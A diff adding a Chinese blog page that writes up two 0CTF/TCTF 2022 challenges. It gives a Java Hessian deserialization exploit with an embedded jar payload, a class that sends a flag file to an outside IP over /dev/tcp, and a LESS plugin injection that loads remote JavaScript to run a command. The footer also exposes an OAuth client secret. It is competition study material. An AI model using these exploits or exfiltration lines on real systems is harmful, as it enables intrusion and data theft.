@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>0ctf/tctf 2022 |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="0ctf/tctf 2022 |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="0ctf/tctf 2022"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/psaIZKtC4/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+        </span>
+            <h1>0ctf/tctf 2022</h1>
+            <span class="meta">
+            	Posted on
+              2022-09-19，9 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <h1 id="hessian-onlyjdk">hessian-onlyjdk</h1>
+<p><a href="https://y4er.com/posts/wangdingbei-badbean-hessian2/">https://y4er.com/posts/wangdingbei-badbean-hessian2/</a></p>
+<p>开头就是网鼎杯的cve。</p>
+<p>重写<code>Hessian2Output</code>和<code>SerializerFactory</code></p>
+<p>触发tostring</p>
+<pre><code class="language-jsx">MimeTypeParameterList-&gt;tostring
+UIDefaults-&gt;get-&gt;getFromHashtable
+SwingLazyValue-&gt;createValue
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://c.img.dasctf.com/images/2022919/1663564033011-edbe9e58-c05c-4f72-a6d1-487c9848cfac.png" alt="Untitled" loading="lazy"></figure>
+<p>构造任意静态方法</p>
+<figure data-type="image" tabindex="2"><img src="https://c.img.dasctf.com/images/2022919/1663564037391-b4675dfe-c406-412f-881d-5bef6861e386.png" alt="Untitled" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://c.img.dasctf.com/images/2022919/1663564039585-8bb6b1f1-722f-4b3b-af5e-7ea6b3ebd6ca.png" alt="Untitled" loading="lazy"></figure>
+<p>这是写文件。<em><code>SAVE_GENERATED</code>  默认无。得去通过另一个静态方法改</em></p>
+<p><a href="https://hosch3n.github.io/2021/07/06/VMware-vCenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/#CVE-2021-21985">https://hosch3n.github.io/2021/07/06/VMware-vCenter漏洞分析（一）/#CVE-2021-21985</a></p>
+<figure data-type="image" tabindex="4"><img src="https://c.img.dasctf.com/images/2022919/1663564126096-0c9269a7-399c-4c99-8874-eee117c04b31.png" alt="Untitled" loading="lazy"></figure>
+<p>至此可以写入任意文件</p>
+<p>最后<code>sun.security.tools.keytool.Main</code>的main方法</p>
+<figure data-type="image" tabindex="5"><img src="https://c.img.dasctf.com/images/2022919/1663564041799-294c5ad3-a995-42e8-8747-011ab56f0927.png" alt="Untitled" loading="lazy"></figure>
+<p>构造参数。加载我们写入的class。触发静态代码块</p>
+<p>Exp:</p>
+<pre><code class="language-jsx">import com.caucho.hessian.io.Hessian2Input;
+import com.caucho.hessian.io.Hessian2Output;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.rowset.JdbcRowSetImpl;
+import sun.swing.SwingLazyValue;
+
+import javax.swing.*;
+import javax.xml.transform.Templates;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.net.URL;
+import java.nio.file.Files;
+import java.util.Arrays;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Hashtable;
+
+public class h2 {
+    public static void setValue(Object target, String name, Object value) throws Exception {
+        Class c = target.getClass();
+        Field field = c.getDeclaredField(name);
+        field.setAccessible(true);
+        field.set(target, value);
+    }
+
+    public static void main(String[] args) throws Exception {
+//转byte[]
+        File file = new File(&quot;guoke.jar&quot;);
+        byte[] fileContent = Files.readAllBytes(file.toPath());
+        System.out.println(Arrays.toString(fileContent));
+				
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        Hessian2Output out = new Hessian2Output(byteArrayOutputStream);
+        Object o = new javax.activation.MimeTypeParameterList();
+        UIDefaults uf = new UIDefaults();
+//修改属性
+        //Object value = new SwingLazyValue(&quot;java.lang.System&quot;,&quot;setProperty&quot;,new Object[]{(Object)&quot;jfr.save.generated.asm&quot;,(Object)&quot;true&quot;});
+//写文件
+        Object value = new SwingLazyValue(&quot;jdk.jfr.internal.Utils&quot;,&quot;writeGeneratedASM&quot;,new Object[]{(Object)&quot;/tmp/guoke&quot;,(Object)new byte[]{80, 75, 3, 4, 20, 0, 8, 8, 8, 0, -10, -91, 49, 85, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 9, 0, 4, 0, 77, 69, 84, 65, 45, 73, 78, 70, 47, -2, -54, 0, 0, 3, 0, 80, 75, 7, 8, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 80, 75, 3, 4, 20, 0, 8, 8, 8, 0, -10, -91, 49, 85, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 20, 0, 0, 0, 77, 69, 84, 65, 45, 73, 78, 70, 47, 77, 65, 78, 73, 70, 69, 83, 84, 46, 77, 70, -13, 77, -52, -53, 76, 75, 45, 46, -47, 13, 75, 45, 42, -50, -52, -49, -77, 82, 48, -44, 51, -32, -27, 114, 46, 74, 77, 44, 73, 77, -47, 117, -86, 4, 9, 88, -24, 25, -60, 27, 25, 24, 41, 104, -8, 23, 37, 38, -25, -92, 42, 56, -25, 23, 21, -28, 23, 37, -106, 0, -43, 107, -14, 114, -15, 114, 1, 0, 80, 75, 7, 8, 77, -51, 55, 15, 68, 0, 0, 0, 69, 0, 0, 0, 80, 75, 3, 4, 20, 0, 8, 8, 8, 0, -10, -91, 49, 85, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 11, 0, 0, 0, 103, 117, 111, 107, 101, 46, 99, 108, 97, 115, 115, 101, 82, -33, 111, 18, 65, 16, -2, 22, 10, 11, 39, -75, -65, -20, 15, -85, -75, 84, 31, 10, 13, 72, 67, 47, 38, 13, -83, -119, 105, -59, 16, -127, -102, 30, -87, -31, -15, 110, -39, -64, -74, 112, -41, 28, 7, -91, -42, -2, 61, 62, -9, 69, -115, 38, -6, -34, 63, -86, 113, -10, 52, 72, -46, 123, -40, -103, -7, -26, -5, 102, -26, 102, -9, -10, -18, -57, 47, 0, 38, 94, 24, 72, 98, -63, -64, 35, 44, 38, -80, -92, -19, 50, -57, 10, -57, 99, 3, 113, -84, 114, 60, -31, 120, -54, 16, -33, 83, -82, 10, 94, 51, 68, 51, -39, 19, -122, -87, 3, -81, 37, 25, 102, -86, -54, -107, -11, 65, -49, -111, 126, -61, 118, -70, -124, 36, -10, 68, -9, 31, 115, -38, 10, 108, 113, 86, -77, -49, -61, 20, -43, 100, 48, 44, 111, -32, 11, 89, 86, -102, 106, -76, 7, -34, -103, 124, 121, 106, 15, -19, 20, 12, 60, -32, 88, 75, -31, 25, -42, 25, -102, -114, -35, -17, -92, -13, 34, 125, 37, 69, -57, -53, 53, -117, -27, -19, -54, -63, 110, -49, 121, 87, 118, 43, -121, 102, -69, 90, 60, -18, -74, -44, -18, 118, 115, -25, -51, -80, 102, -103, -93, -70, 101, 22, -21, -105, 100, 15, 43, -61, 90, -93, -10, -87, 126, -79, -65, 127, -3, -7, -118, -118, -56, 87, 102, 46, -33, -6, -21, 119, 114, 121, 117, -99, 66, 26, 27, 12, 11, -70, 105, 65, 121, -123, -54, -47, -37, -111, -112, -25, -127, -14, 92, -122, -43, 16, -19, -38, 110, -69, 112, 60, 112, 3, -43, -109, -29, -92, 30, -16, 57, 67, 44, 28, -103, 97, -10, 63, -13, -56, 57, -107, 34, 96, -104, -69, 39, -42, 127, 40, -125, 113, -80, -104, -55, 86, -17, 113, 74, -76, 74, 57, -110, -126, 97, 51, 51, -111, -75, 2, 95, -71, -19, -46, -92, -32, -125, -17, 9, -39, -17, -109, 96, 101, -110, -39, -24, -8, -34, -123, -34, 111, 41, 123, -126, 13, 36, -24, 46, -11, 23, 1, -45, 43, -91, 51, 69, -47, 26, 89, 70, 54, -74, -11, 13, -20, -122, 28, -70, 28, 58, -29, 33, 24, 37, -47, -61, 49, -75, 65, -79, 70, -105, -65, 35, 50, 31, -3, -118, -87, -113, 95, 48, -3, -2, 39, -30, 77, -46, -14, -33, 55, 97, 50, 73, -44, 24, -11, -48, 69, -106, -56, -45, -91, -110, 33, -54, 9, -93, 87, 68, -67, 103, 8, -27, -120, 84, 57, 102, -109, 36, -102, 11, -121, -102, -1, 3, 80, 75, 7, 8, 5, 64, 102, -91, -65, 1, 0, 0, 118, 2, 0, 0, 80, 75, 1, 2, 20, 0, 20, 0, 8, 8, 8, 0, -10, -91, 49, 85, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 9, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 77, 69, 84, 65, 45, 73, 78, 70, 47, -2, -54, 0, 0, 80, 75, 1, 2, 20, 0, 20, 0, 8, 8, 8, 0, -10, -91, 49, 85, 77, -51, 55, 15, 68, 0, 0, 0, 69, 0, 0, 0, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 61, 0, 0, 0, 77, 69, 84, 65, 45, 73, 78, 70, 47, 77, 65, 78, 73, 70, 69, 83, 84, 46, 77, 70, 80, 75, 1, 2, 20, 0, 20, 0, 8, 8, 8, 0, -10, -91, 49, 85, 5, 64, 102, -91, -65, 1, 0, 0, 118, 2, 0, 0, 11, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -61, 0, 0, 0, 103, 117, 111, 107, 101, 46, 99, 108, 97, 115, 115, 80, 75, 5, 6, 0, 0, 0, 0, 3, 0, 3, 0, -74, 0, 0, 0, -69, 2, 0, 0, 0, 0}});
+//触发
+        //Object value = new SwingLazyValue(&quot;sun.security.tools.keytool.Main&quot;,&quot;main&quot;,new Object[]{new String[]{&quot;-genkeypair&quot;,&quot;-keypass&quot;,&quot;123456&quot;,&quot;-keystore&quot;,&quot;hackxxx&quot;,&quot;-storepass&quot;,&quot;123456&quot;,&quot;-providername&quot;,&quot;hackx&quot;,&quot;-providerclass&quot;,&quot;guoke&quot;,&quot;-providerpath&quot;,&quot;/tmp/guoke.class&quot;}});
+        uf.put(&quot;key&quot;,value);
+
+        setValue(o, &quot;parameters&quot;, uf);
+        out.writeString(&quot;aaa&quot;);
+        out.writeObject(o);
+        out.flushBuffer();
+        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
+        Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream((byteArrayOutputStream.toByteArray())));
+        hessian2Input.readObject();
+
+    }
+}
+</code></pre>
+<pre><code class="language-jsx">
+import java.io.IOException;
+
+public class guoke {
+    static {
+        try {
+            Runtime.getRuntime().exec(&quot;bash -c {echo,Y2F0IC9mbGFnID4gL2Rldi90Y3AvMS4xNS42Ny4xNDIvMTMzNw==}|{base64,-d}|{bash,-i}&quot;);
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+    }
+}
+</code></pre>
+<h1 id="ohf">ohf</h1>
+<p>http://106.14.63.236/)</p>
+<p>https://tttang.com/archive/1714/#toc_0x03-phar</p>
+<p>css 读源码</p>
+<pre><code class="language-jsx">//F12有源码名
+.test {
+  content: data-uri('ohf_main_to_be_deployed.go');
+}
+</code></pre>
+<p>读到源码。用lessc转换我们输入的东西</p>
+<p>https://zhuanlan.zhihu.com/p/389345632</p>
+<p>远程写个js</p>
+<pre><code>@plugin &quot;http://1.15.67.142/1.js&quot;;
+body {
+color: cmd('/readflag');
+}
+</code></pre>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/7bmeIZWPa/">
+              <span class="post-title">
+                第五空间&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
